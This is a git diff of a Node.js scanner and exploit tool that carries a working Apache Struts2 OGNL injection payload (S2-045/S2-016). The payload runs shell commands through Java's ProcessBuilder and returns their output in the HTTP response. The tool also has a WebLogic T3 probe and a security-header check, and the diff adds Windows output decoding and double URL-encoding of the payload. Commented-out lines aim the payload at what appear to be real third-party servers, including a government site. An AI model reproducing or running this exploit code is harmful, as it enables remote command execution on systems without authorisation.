@@ -7,12 +7,13 @@ var szMyName = 'M.T.X._2017-06-08',
 	fs = require('fs'),
 	url = "",bReDo = false, szLstLocation = "",
 	g_oRst = {},
+	iconv = require("iconv-lite"),
 	a = process.argv.splice(2),
 	bRunHost = false,
 	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
 	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
-	g_szCmdW = "echo whoami: && whoami && echo pwd: && pwd && echo cmdend",
-	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
+	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
+	aHS = "content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
 	g_postData = "%{(#nike='multipart/form-data')"
 		// s-045不允许下面的代码
 		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
@@ -32,11 +33,12 @@ var szMyName = 'M.T.X._2017-06-08',
 		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
 		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
 		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
-		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
-		+ ".getOutputStream()))"
+		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
+
 	    // 我添加的当前位置行加上后，会无法输出
 	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
-		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
+		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
+		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
 		+ ".(#ros.flush()).(#ros.close())}"
 		;
 
@@ -48,7 +50,6 @@ process.env.NODE_ENV = "production";
 // https://www.exploit-db.com/exploits/41783/
 // /?{{%25}}cake\=1
 // /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1
-
 // 基于socket发送数据
 function fnSocket(h,p,szSend,fnCbk)
 {
@@ -69,6 +70,7 @@ function fnSocket(h,p,szSend,fnCbk)
 function checkWeblogicT3(h,p)
 {
 	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
+	// console.log(s);
 	fnSocket(h,p,s,function(data)
 	{
 		var d = data && data.toString().trim() || "", 
@@ -77,6 +79,7 @@ function checkWeblogicT3(h,p)
 		console.log(re.test(d));
 	});
 }
+// checkWeblogicT3("192.168.18.89",7001);
 
 // 解析裸头信息
 function fnParseHttpHd(s,fnCbk)
@@ -182,14 +185,10 @@ function fnTest(s)
 	      		if(!response.headers[aHS[k]])
 	      		{
 	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
-	      			g_oRst.safeHeader[aHS[k]] = "应该有有该安全头信息 " + aHS[k];
+	      			g_oRst.safeHeader[aHS[k]] = "确定不需要该安全头信息 " + aHS[k];
 	      		}
 	      	}
-
-	      	if(response.headers['content-type'])
-	      	{
-	      		;
-	      	}
+	      	g_oRst.safeHeader.des = "作为安全要求、规范要求，建议加上缺失的头信息";
 	    }
 	  );
 }
@@ -302,11 +301,12 @@ function doStruts2_016(url)
 		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
 		+ ".(#ros.flush()).(#ros.close())}");
 	////////////////////////*/
-	request({method: 'GET',uri: url + "?redirect:" + encodeURIComponent(g_postData)
+	request({method: 'GET',encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
 		}, 
     	function(e,r,b)
     {
     	// console.log(b);
+    	// if(-1 < b.indexOf("administrator"))console.log(b.toString("gbk"));
     	if(!e)fnDoBody(b,"s2-016");
     	// console.log(e || b || r);
     });
@@ -327,6 +327,13 @@ function myLog(a)
 g_oRst.struts2 || (g_oRst.struts2 = {});
 function fnDoBody(body,t,rep)
 {
+	// win 字符集处理
+	if(body && -1 < String(body).indexOf("administrator"))
+	{
+		 body = iconv.decode(body,"cp936").toString("utf8");
+		 // console.log(body);
+	}
+
 	var e = fnGetErrMsg(body);
 	if(e)g_oRst.errMsg = e;
 	// console.log(t);
@@ -347,7 +354,7 @@ function fnDoBody(body,t,rep)
 		// myLog(arguments);
 	}
 	if(!body)return;
-	body = body.trim();
+	body = body.toString("utf8").trim();
 
 	g_oRst.config || (g_oRst.config = {});
 	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
@@ -517,7 +524,7 @@ function fnTestAll()
 // java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.178.10.1/24:7001
 function fnCheckJavaFx(s)
 {
-	var szF = "~/safe/mtx_jfxl/bin/jfxl.jar";
+	var szF = "~/safe/mtx_jfxl/jfxl.jar";
 	child_process.exec("ls " + szF,function(e,so,se)
 	{
 		if(!so)console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git");
@@ -639,11 +646,24 @@ function fnCheckTa3(u)
 	}
 	
 }
+// 全部编码为%xx格式
+function fnMakeData(s)
+{
+	return s.replace(/./gmi,function(a)
+	{
+		return '%' + String(a).charCodeAt(0).toString(16);
+	});
+}
 
-// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.10.115:8080
+// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.18.89:7001
 /*
-request.get(
-	"http://gx.si.gov.cn:8870/jbwtqt/netHallHomeAction!turnPageList.do?channelid=" + encodeURIComponent(g_postData)
+// console.log(fnMakeData(g_postData));
+request.post(//  + encodeURIComponent(g_postData)
+	{
+	uri:"http://118.112..108:9289/ypcx/services?fileUpload",
+	headers:{'Content-Type':'text/xml;charset=UTF-8'},
+	formData:{"k":fnMakeData(fnMakeData(g_postData))}
+	}
 	,function(e,r)
 	{
 		if(!e)console.log(r.body);
@@ -671,7 +691,7 @@ if(0 < a.length)
 	////////////////////*/
 }
 
-// checkWeblogicT3("192.168.10.133",9001);
+
 process.on('exit', (code) => 
 {
 	console.log(JSON.stringify(g_oRst,null,' '));
